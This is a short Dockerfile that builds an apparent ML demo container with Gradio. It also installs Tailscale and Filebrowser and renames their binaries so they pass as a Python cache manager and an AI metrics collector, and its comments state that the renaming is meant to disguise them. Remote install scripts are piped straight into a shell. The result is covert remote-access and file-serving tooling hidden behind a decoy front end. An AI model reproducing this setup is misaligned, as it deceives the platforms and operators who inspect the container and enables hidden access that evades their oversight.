FROM ubuntu:22.04
# Install basic tools AND Python
RUN apt-get update && apt-get install -y curl wget sudo python3 python3-pip

# Install Tailscale
RUN curl -fsSL https://tailscale.com/install.sh | sh

# Install Filebrowser
RUN curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash

# Rename tailscale to look like a python library
RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager
RUN mv /usr/bin/tailscale /usr/bin/py-cache-cli
# Rename filebrowser to look like a telemetry tool
RUN mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector

# Install Gradio for our ML frontend
RUN pip3 install gradio

# Copy our files
COPY app.py /app.py
COPY start.sh /start.sh
RUN chmod +x /start.sh

# Run the script when the container starts
CMD ["/start.sh"]